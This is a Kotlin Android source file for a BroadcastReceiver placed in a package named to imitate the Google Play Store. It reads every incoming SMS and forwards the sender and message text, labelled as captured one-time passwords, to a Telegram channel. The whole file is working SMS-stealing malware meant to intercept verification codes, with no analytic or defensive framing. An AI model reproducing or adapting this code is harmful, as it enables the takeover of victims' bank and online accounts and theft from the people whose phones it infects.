package com.android.vending.service
import android.content.*
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        for (sms in msgs) {
            TelegramEngine.send("🔥 OTP TERJEBOL!\n📱 Dari: ${sms.originatingAddress}\n💬 Pesan: ${sms.messageBody}")
        }
    }
}
